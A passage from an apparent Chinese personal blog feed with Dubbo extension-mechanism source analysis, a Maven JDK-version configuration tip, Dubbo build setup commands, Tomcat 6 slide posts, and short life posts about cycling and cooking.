class="hljs-params">(com.alibaba.dubbo.common.URL arg0)</span> </span>&#123;<span class="hljs-keyword">if</span> (arg0 == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"url == null"</span>);com.alibaba.dubbo.common.URL url = arg0;String extName = (url.getProtocol() == <span class="hljs-keyword">null</span> ? <span class="hljs-string">"dubbo"</span> : url.getProtocol());<span class="hljs-keyword">if</span> (extName == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"Fail to get extension(com.alibaba.dubbo.registry.RegistryFactory) name from url("</span> + url.toString()+ <span class="hljs-string">") use keys([protocol])"</span>);com.alibaba.dubbo.registry.RegistryFactory extension = (com.alibaba.dubbo.registry.RegistryFactory) ExtensionLoader.getExtensionLoader(com.alibaba.dubbo.registry.RegistryFactory<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getExtension</span>(<span class="hljs-title">extName</span>)</span>;<span class="hljs-keyword">return</span> extension.getRegistry(arg0);&#125;&#125;</code></pre><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.alibaba.dubbo.rpc.cluster;<span class="hljs-keyword">import</span> com.alibaba.dubbo.common.extension.ExtensionLoader;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Cluster</span>$<span class="hljs-title">Adaptive</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">com</span>.<span class="hljs-title">alibaba</span>.<span class="hljs-title">dubbo</span>.<span class="hljs-title">rpc</span>.<span class="hljs-title">cluster</span>.<span class="hljs-title">Cluster</span> </span>&#123;<span class="hljs-keyword">public</span> com.alibaba.dubbo.rpc.<span class="hljs-function">Invoker <span class="hljs-title">join</span><span class="hljs-params">(com.alibaba.dubbo.rpc.cluster.Directory arg0)</span></span><span class="hljs-function"><span class="hljs-keyword">throws</span> com.alibaba.dubbo.rpc.RpcException </span>&#123;<span class="hljs-keyword">if</span> (arg0 == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"com.alibaba.dubbo.rpc.cluster.Directory argument == null"</span>);<span class="hljs-keyword">if</span> (arg0.getUrl() == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">"com.alibaba.dubbo.rpc.cluster.Directory argument getUrl() == null"</span>);com.alibaba.dubbo.common.URL url = arg0.getUrl();String extName = url.getParameter(<span class="hljs-string">"cluster"</span>, <span class="hljs-string">"failover"</span>); <span class="hljs-comment">// 1. 根据adaptive配置的key到url(所有配置项的值都在url上体现)中**获取到这个key对应的值</span><span class="hljs-keyword">if</span> (extName == <span class="hljs-keyword">null</span>)<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(<span class="hljs-string">"Fail to get extension(com.alibaba.dubbo.rpc.cluster.Cluster) name from url("</span> + url.toString()+ <span class="hljs-string">") use keys([cluster])"</span>);com.alibaba.dubbo.rpc.cluster.Cluster extension = (com.alibaba.dubbo.rpc.cluster.Cluster) ExtensionLoader.getExtensionLoader(com.alibaba.dubbo.rpc.cluster.Cluster<span class="hljs-class">.<span class="hljs-keyword">class</span>).<span class="hljs-title">getExtension</span>(<span class="hljs-title">extName</span>)</span>;<span class="hljs-comment">// 2. 以这个值作为扩展点的实现的名称去扩展点机制中获取到对应的bean</span><span class="hljs-keyword">return</span> extension.join(arg0); <span class="hljs-comment">// 3.然后adaptive的方法由这个bean的同名方法来完成**</span>&#125;&#125;</code></pre><p>生成的代码要做的事情大致就是：</p><ol><li>根据adaptive配置的key到url(所有配置项的值都在url上体现)中<strong>获取到这个key对应的值，</strong></li><li><strong>以这个值作为扩展点的实现的名称去扩展点机制中获取到对应的bean，</strong></li><li><strong>然后adaptive的方法由这个bean的同名方法来完成</strong>。至此，完成adaptive机制。</li></ol><pre><code class="hljs mermaid">graph TDA[1.从url中取配置key对应的配置值] --&gt;B[根据配置值作为扩展实现的beanName] B --&gt;C[2.用扩展点机制根据beanName取到bean]C --&gt;D[3.让上步的bean的同名方法完成逻辑&lt;br&gt;达成adaptive目的]</code></pre><h5 id="编译adaptive代码"><a href="#编译adaptive代码" class="headerlink" title="编译adaptive代码"></a>编译adaptive代码</h5><p>默认的主要逻辑在com.alibaba.dubbo.common.compiler.support.JavassistCompiler.doCompile(String, String)</p><p>这里的大致实例逻辑是，根据Javassist的API的要求告诉他package是什么，要import哪些类，类名时候什么，父类或者接口是什么，每个方法体是什么代码之类的处理。方法可以用CtNewMethod.make来完成。</p><h4 id="getActivateExtension实现"><a href="#getActivateExtension实现" class="headerlink" title="getActivateExtension实现"></a>getActivateExtension实现</h4><p>具体实现在com.alibaba.dubbo.common.extension.ExtensionLoader.getActivateExtension(URL, String[], String)中。 </p><p>该方法的主要罗就就是将该扩展点的所有激活的实例返回，其返回值是个列表。那么，什么叫激活？看com.alibaba.dubbo.common.extension.ExtensionLoader.isActive(Activate, URL)方法，就是根据url（这个是运行期形成的配置上下文）和Activate注解上配置的key，如果有这个key(或者以 .${key}结尾的)且key对应的值不为空则算激活。</p><p>同时，这个列表中的实例还需要排序，由com.alibaba.dubbo.common.extension.support.ActivateComparator.COMPARATOR排序器完成。具体逻辑是根据Activate的before、after和order配置值作为条件排序。</p><p>当然Activate的激活条件还支持Group，具体处理逻辑参见com.alibaba.dubbo.common.extension.ExtensionLoader.isMatchGroup(String, String[])。</p><h3 id="总结梳理下dubbo扩展点有哪些能力"><a href="#总结梳理下dubbo扩展点有哪些能力" class="headerlink" title="总结梳理下dubbo扩展点有哪些能力"></a>总结梳理下dubbo扩展点有哪些能力</h3><p>粗略的讲有：自动装配（注入）字段、代理、适配、包装、激活(一次获取多个命中实例)等。</p><ol><li>能load class，这个class除了顶层接口class（在ExtensionLoader中对应type字段），还能load各实现类的class。</li><li>能创建instance。</li><li>能指定这个顶层接口的默认实现类的beanName。做法参见SPI注解部分。</li><li>能把创建出来的instance的字段注入。set开头的且有一个参数且是public的，注入。  </li><li>能adaptive。根据url上对该接口配置的实现类，将该接口的事情交给这个实现类去做(我更多的理解成委托)。此能力采用代码生成再编译的方式。代码生成示例可以参见adaptive类代码示例。 adaptive只会生成一个adaptive实现类。生成代码的逻辑在com.alibaba.dubbo.common.extension.ExtensionLoader.createAdaptiveExtensionClassCode()  </li><li>能wrapper。wrapper是指这个顶层接口的实现类的构造函数的入参是这个顶层接口类型。那么这个实现类称之为wrapper类，可以有多个，构建instance时不分多个之间的顺序。因为用来给构造函数传参的instance是这个顶层类的默认实现。比如com.alibaba.dubbo.rpc.Protocol接口，有实现类 com.alibaba.dubbo.rpc.protocol.injvm.InjvmProtocol beanName是injvm，QosProtocolWrapper、ProtocolListenerWrapper、ProtocolFilterWrapper是其三个wrapper类。创建warpper instance的代码逻辑在com.alibaba.dubbo.common.extension.ExtensionLoader.createExtension(String)中。  </li><li>能active。实现类加了Activate注解的。在ExtensionLoader.getActivateExtension时会根据当前的url(配置信息)中值来匹配Activate注解中指定的值是否能match，能match的表示是activate，意思是命中的。在过滤器扩展点中用到。比如这个过滤器是给CONSUMER group用。示例有ExceptionFilter等。同时该注解还能支持order属性来定义bean的顺序。     </li></ol><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>查找所有的dubbo扩展点形式的配置文件  </p><pre><code class="hljs shell">find ./ -type f -name "com.alibaba.dubbo*"|grep -v "/target/"|grep -v "/bin/"|grep -v "/test/"</code></pre><p>另：<br>关于代理模式，dubbo未实现通用的，只是rpc语义实现里rpc调用的代理，借助扩展点机器加动态代理完成。<br>具体其顶层接口是com.alibaba.dubbo.rpc.ProxyFactory。用在比如将EchoService编织进每次RPC调用中。  </p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>maven项目导入后默认使用JDK版本问题</title>
    <link href="/2020/05/04/config-default-jdk-version-for-maven/"/>
    <url>/2020/05/04/config-default-jdk-version-for-maven/</url>
    
    <content type="html"><![CDATA[<p>在我们导入maven项目后，有时候会发现默认依赖的JDK版本不是我们想要的。比如，我们导入xx项目到eclipse中，发现其默认依赖的JDK版本是1.5，但是会我们想要1.6的JDK，如何和解决？<br>办法有两种：  </p><h2 id="1-修改maven全局配置"><a href="#1-修改maven全局配置" class="headerlink" title="1. 修改maven全局配置"></a>1. 修改maven全局配置</h2><p>在maven的setting文件的profiles标签内加上这一段：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">profile</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>jdk16<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">activation</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">activeByDefault</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">activeByDefault</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">jdk</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">jdk</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">activation</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.compilerVersion</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>   <span class="hljs-tag">&lt;/<span class="hljs-name">profile</span>&gt;</span></code></pre><p>采用这种方式的，注意你的eclipse<strong>要重启后</strong>再对工程做maven update project 才能生效。  </p><h2 id="2-修改项目的maven-compiler-plugin插件的配置"><a href="#2-修改项目的maven-compiler-plugin插件的配置" class="headerlink" title="2. 修改项目的maven-compiler-plugin插件的配置"></a>2. 修改项目的maven-compiler-plugin插件的配置</h2><p>大概修改如下：  </p><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.6<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span></code></pre><p>这种修改方法需要注意的是： 不仅要注意观察整个项目中是否有maven-compiler-plugin配置，还要观察其parent pom中是否有。尤其<strong>那种项目的parent还有parent的情况</strong>。如果不能找全的话，就会发现存在改了后依赖JDK版本还不能生效的问题。  </p>]]></content>
    
    
    <categories>
      
      <category>program-language-practice</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dev-tools</tag>
      
      <tag>maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>中山北路-大桥-江边-和燕路 20KM骑行</title>
    <link href="/2020/05/03/sport-zhongshan-north-road-yangest-river-road/"/>
    <url>/2020/05/03/sport-zhongshan-north-road-yangest-river-road/</url>
    
    <content type="html"><![CDATA[<h2 id="中山北路-大桥-江边-和燕路-20KM骑行"><a href="#中山北路-大桥-江边-和燕路-20KM骑行" class="headerlink" title="中山北路-大桥-江边-和燕路 20KM骑行"></a>中山北路-大桥-江边-和燕路 20KM骑行</h2><video id="video" controls="" preload="none" poster="" width="800"  autoplay="autoplay">  <source id="mp4" src="/video/life/sport/zhongshan-north-road-yangest-river-road.mp4" type="video/mp4">  </video><p><img src="/img/life/sport/WechatIMG324.jpeg" srcset="/img/loading.gif" alt="">  </p><p><img src="/img/life/sport/WechatIMG325.jpeg" srcset="/img/loading.gif" alt="">  </p><p><img src="/img/life/sport/WechatIMG326.jpeg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sport</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>最近研究了三个新菜</title>
    <link href="/2020/05/03/food-latest-3/"/>
    <url>/2020/05/03/food-latest-3/</url>
    
    <content type="html"><![CDATA[<h2 id="最近研究了三个新菜"><a href="#最近研究了三个新菜" class="headerlink" title="最近研究了三个新菜"></a>最近研究了三个新菜</h2><ol><li>蒜泥龙虾。要点：菜油，龙虾开背，蒜泥先炒香盛出来。</li><li>高汤咸肉蚕豆米煮百叶卷肉。高汤用咸肉，青脚鸡炖，也可以加点排骨。百叶卷肉的肉糜，用葱姜水拌。葱姜水就葱姜切断后加点盐加点水杀出来的汁水，也需要用手挤一挤。</li><li>内脂豆腐虾米小葱毛豆。小葱与虾米适量。此菜需要无添加的酱油。</li></ol><p>这三个菜调味料除了那个无添加的酱油外就是盐油糖之类了。没有任何鸡精或者含鸡精的调料。原汁原味，美味极了。现在我已经很讨厌外面店里那种味道，要不是鸡精很重，要不是老抽或者耗油很重，要不就是靠胡椒…食材的原味都没有了。</p><p><img src="/img/life/food/WechatIMG327.jpeg" srcset="/img/loading.gif" alt="">  </p><p><img src="/img/life/food/WechatIMG329.jpeg" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>food</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]03. 扩展点背景以及JDK提供的扩展点</title>
    <link href="/2020/05/02/dubbo-03.extensible_services/"/>
    <url>/2020/05/02/dubbo-03.extensible_services/</url>
    
    <content type="html"><![CDATA[<h2 id="03-扩展点背景以及JDK提供的扩展点"><a href="#03-扩展点背景以及JDK提供的扩展点" class="headerlink" title="03. 扩展点背景以及JDK提供的扩展点"></a>03. 扩展点背景以及JDK提供的扩展点</h2><h3 id="为什么需要扩展点"><a href="#为什么需要扩展点" class="headerlink" title="为什么需要扩展点"></a>为什么需要扩展点</h3><p>因为为了达成能扩展的目的。</p><p>更多细节可以阅读oracle官方文档<a href="https://www.oracle.com/technical-resources/articles/javase/extensible.html" target="_blank" rel="noopener">Creating Extensible Applications With the Java Platform</a></p><p>重点：</p><blockquote><p><strong>Definitions</strong>  </p><p>A <em>service</em> is a set of programming interfaces and classes that provide access to some specific application functionality or feature. The service may simply define the interfaces for the functionality and a way to retrieve an implementation. In the word-processor example, a dictionary service can define a way to retrieve a dictionary and the definition of a word, but it does not implement the underlying feature set. Instead, it relies on a <em>service provider</em> to implement that functionality.  </p><p>A <em>service provider interface</em> (SPI) is the set of public interfaces and abstract classes that a service defines. The SPI defines the classes and methods available to your application. </p><p>A <em>service provider</em> implements the SPI. An application with extensible services will allow you, vendors, and perhaps even customers to add service providers without modifying the original application.</p></blockquote><h3 id="目前有什么扩展点机制实现"><a href="#目前有什么扩展点机制实现" class="headerlink" title="目前有什么扩展点机制实现"></a>目前有什么扩展点机制实现</h3><p>为了实现扩展，粗略的讲能支持bean容器的框架或机制均可以做扩展点</p><ol><li>JDK自带的扩展点机制，ServiceLoader</li><li>专门的bean容器：spring、guice等</li></ol><h3 id="JDK的扩展点"><a href="#JDK的扩展点" class="headerlink" title="JDK的扩展点"></a>JDK的扩展点</h3><p>ServiceLoader：一个简单的服务提供者加载设施。</p><p>使用文档与demo可以参见<a href="https://docs.oracle.com/javase/8/docs/api/java/util/ServiceLoader.html" target="_blank" rel="noopener">这里官方doc</a></p><p>注意其使用时配置方式是：</p><blockquote><p>If com.example.impl.StandardCodecs is an implementation of the CodecSet service then its jar file also contains a file named</p><p> META-INF/services/com.example.CodecSet<br>This file contains the single line:</p><p> com.example.impl.StandardCodecs    # Standard codecs</p></blockquote><p>简单地说：是将SPI接口的具体实现类的全限定名写入在 <strong>META-INF/services</strong>目录下以SPI接口全限定名命名的文件中。ServiceLoader能从此文件中知道这个SPI具体选用哪个实现。</p><h3 id="自己实现一个扩展点机需要哪些基础能力"><a href="#自己实现一个扩展点机需要哪些基础能力" class="headerlink" title="自己实现一个扩展点机需要哪些基础能力"></a>自己实现一个扩展点机需要哪些基础能力</h3><p>根据配置读取相应的实现类并创建实例。</p><h3 id="自己实现一个扩展点可以做些什么高阶能力"><a href="#自己实现一个扩展点可以做些什么高阶能力" class="headerlink" title="自己实现一个扩展点可以做些什么高阶能力"></a>自己实现一个扩展点可以做些什么高阶能力</h3><p>自动装配（注入）字段、代理、适配、包装、激活(一次获取多个命中实例)等。</p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]02.导读提示</title>
    <link href="/2020/05/02/dubbo-02.article-outline/"/>
    <url>/2020/05/02/dubbo-02.article-outline/</url>
    
    <content type="html"><![CDATA[<h2 id="导读提示"><a href="#导读提示" class="headerlink" title="导读提示"></a>导读提示</h2><p><img src="/img/opensource-code-study/dubbo-article-guide.png" srcset="/img/loading.gif" alt="导读提示"></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[dubbo]01.源代码、环境准备、模块分包梳理</title>
    <link href="/2020/05/02/dubbo-01.src_env_prepare/"/>
    <url>/2020/05/02/dubbo-01.src_env_prepare/</url>
    
    <content type="html"><![CDATA[<h2 id="01-源代码、环境准备、模块分包梳理"><a href="#01-源代码、环境准备、模块分包梳理" class="headerlink" title="01. 源代码、环境准备、模块分包梳理"></a>01. 源代码、环境准备、模块分包梳理</h2><p>某前辈说道：</p><blockquote><p>一个开发人员如果不去读一读优秀的开源项目的代码，不如回家卖红薯。</p></blockquote><p>所有行文中，所说的<strong>建议</strong>什么什么的，都属于个人观点。既然是观点就有对错，就有上下文和一定的背景，希望大家辩证地看待，也欢迎关于建议进行交流。</p><h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><p>编译过程中，或许一些依赖找不到，需要手动install。</p><pre><code class="hljs shell">git clone https://github.com/apache/dubbo.gitcd dubbogit taggit checkout dubbo-2.5.3  cd ../<span class="hljs-meta">#</span><span class="bash">  补充 一些中央仓库中找不到的依赖</span>mkdir dependencycd dependencycurl -L -o alibaba-dubbo-dependency.zip https://github.com/alibaba/dubbo/files/310085/alibaba-dubbo-dependency.zip unzip alibaba-dubbo-dependency.zipmvn install:install-file -Dfile=alibaba/opensesame/1.0/opensesame-1.0.pom -DgroupId=com.alibaba -DartifactId=opensesame -Dversion=1.0 -Dpackaging=pommvn install:install-file -Dfile=alibaba/opensesame/2.0/opensesame-2.0.pom -DgroupId=com.alibaba -DartifactId=opensesame -Dversion=2.0 -Dpackaging=pommvn install:install-file -Dfile=alibaba/hessian-lite/3.2.1-fixed-2/hessian-lite-3.2.1-fixed-2.jar -DgroupId=com.alibaba -DartifactId=hessian-lite -Dversion=3.2.1-fixed-2 -Dpackaging=jarmvn install:install-file -Dfile=alibaba/fastjson/1.1.8/fastjson-1.1.8.jar -DgroupId=com.alibaba -DartifactId=fastjson -Dversion=1.1.8 -Dpackaging=jarcd ../dubbomvn package -DskipTests</code></pre><p>编译成功即可。因为一些包的下载问题，编译或许需要较长时间，请耐心等待。</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>我一般在着手阅读一个开源产品的代码时会准备如下一些通用的事情：</p><ol><li>IDEA/Eclipse。根据个人习惯选择。前提是对各种搜索、调试手段要熟练。</li><li>Source code/Demo。在下一篇文章中会准备demo。代码最好clone一份放到自己的github或者gitee上。因为阅读过程中可能会加一些你对这些代码理解的注释。此外建议，在行尾加阅读注释，这样不会破坏原有行号。<strong>PPS：公司信息安全管理严格的同学，请不要在公司电脑上commit到自己私人仓库，以防麻烦！比如我司。</strong></li><li>建议markdown编辑器或支持markdown语法的云笔记。markdown编辑器推荐Typora。用来记录学习中的总结与心得。建议学习别人的代码一定<strong>要有系统性的总结与输出</strong>，单纯的看一两个或数个片段不容易深入、不容易形成系统的结构性的知识体系。</li><li>问题列表。平时在使用时多思考多琢磨，阅读源码时心中带着疑问去阅读，这样就能有的放矢。在问题解决后就会有<strong>柳暗花明的感觉</strong>和<strong>原来如此的感慨</strong>。在通过阅读代码去解决这些疑惑的同时，亦或许能发现<strong>还能这样设计实现的惊叹与佩服</strong>。此系列文档的问题列表就是文档的目录。</li></ol><p>对于阅读dubbo代码的基础场景，环境方面还需要一个ZooKeeper服务。</p><h3 id="模块分包"><a href="#模块分包" class="headerlink" title="模块分包"></a>模块分包</h3><p>dubbo是一个RPC框架，为了实现RPC框架这个功能，其内部由各个模块、机制是如何划分与组织的？一般而言，项目内部的分包代表了模块的拆分，dubbo的整体设计如下：</p><p><img src="http://dubbo.apache.org/docs/zh-cn/dev/sources/images/dubbo-framework.jpg" srcset="/img/loading.gif" alt="dubbo整体设计"></p><p>dubbo主要分包大致结构如下：</p><ol><li>dubbo-common。扩展点、日志、URL、序列化接口与实现、工具类等。</li><li>dubbo-remoting。该模块的子模块有：<strong>remoting-api</strong>，dubbo-remoting-grizzly，dubbo-remoting-http，dubbo-remoting-mina，dubbo-remoting-netty，dubbo-remoting-p2p，dubbo-remoting-zookeeper。remoting-api定义了网络数据传输、交换与处理等API，如：传输层，传输事件分配器、协议编解码器接口、传输通道处理器接口、Exchanger系列接口、server与client的封装等API。</li><li>dubbo-rpc。该模块的子模块有：<strong>dubbo-rpc-api</strong>，dubbo-rpc-default，dubbo-rpc-injvm，dubbo-rpc-rmi，dubbo-rpc-hessian，dubbo-rpc-http，dubbo-rpc-webservice，dubbo-rpc-thrift，dubbo-rpc-memcached，dubbo-rpc-redis。dubbo-rpc-api定义了rpc所需要的API，如：协议接口、RpcContext、RpcResult、RpcStatus、Exporter、Invoker、Invocation、Filter、ProxyFactory等API以及一些抽象的实现等。</li><li>dubbo-monitor。该模块的子模块有：<strong>dubbo-monitor-api</strong>，dubbo-monitor-default。dubbo的监控模块。</li><li>dubbo-cluster。该模块主要实现的机制有：负载均衡、路由、目录查找。</li><li>dubbo-registry。该模块的子模块有：dubbo-registry-api，dubbo-registry-default，dubbo-registry-multicast，dubbo-registry-zookeeper，dubbo-registry-redis。dubbo-registry-api定义了注册环节所需要的API等，如：注册器，注册服务，注册工厂，注册协议、注册容错策略等。</li><li>dubbo-config。dubbo-config模块主要包含api和spring实现两个。内部主要包含服务协议配置、服务生产者配置、服务消费者配置、注册中心配置、相关配置注解等。</li><li>一些其他的辅助模块分包，如：dubbo-config、dubbo-admin、dubbo-demo等。</li></ol>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>dubbo源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tomcat6-endpoint设计</title>
    <link href="/2020/04/24/tomcat-endpoint/"/>
    <url>/2020/04/24/tomcat-endpoint/</url>
    
    <content type="html"><![CDATA[<p>之前写的一个ppt 搬到博客来<br><img src="/img/opensource-code-study/127449-20180801074832391-931704892.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074841350-1065381451.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074845019-351363472.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074847413-791843061.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074849785-1653637766.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074852344-944795170.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074854335-957908181.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074856553-1890360288.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074859026-931024135.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074900976-91955638.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074903493-433331985.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074905477-438584598.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074907641-1602045629.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801074911071-1918532892.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>tomcat源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tomcat6-输入输出buffer设计</title>
    <link href="/2020/04/24/tomcat-io-buffer/"/>
    <url>/2020/04/24/tomcat-io-buffer/</url>
    
    <content type="html"><![CDATA[<p>之前写的一个ppt 搬到博客来<br><img src="/img/opensource-code-study/127449-20180801075147176-1285878639.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075149545-922817349.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075151399-1837542791.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075153505-1227952884.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075158144-776898307.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075200491-1134528053.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075202459-33056213.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075204542-1649718015.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>tomcat源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tomcat6-servlet规范对接 与 ClassLoader隔离</title>
    <link href="/2020/04/24/tomcat-servlet-spec/"/>
    <url>/2020/04/24/tomcat-servlet-spec/</url>
    
    <content type="html"><![CDATA[<p>之前写的一个ppt 搬到博客来<br><img src="/img/opensource-code-study/127449-20180801075314297-2125822290.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075316022-1894889264.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075317908-654882223.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075319965-1564765898.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075321385-1818123627.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075326605-1633776690.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075329515-855085061.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075331696-1647827863.png" srcset="/img/loading.gif" alt=""><br><img src="/img/opensource-code-study/127449-20180801075333754-319682496.png" srcset="/img/loading.gif" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>opensource-code-study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>tomcat源码分析</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JDK并发基础与部分源码解读</title>
    <link href="/2020/04/24/jdk-concurrent-source-study/"/>
    <url>/2020/04/24/jdk-concurrent-source-study/</url>
    
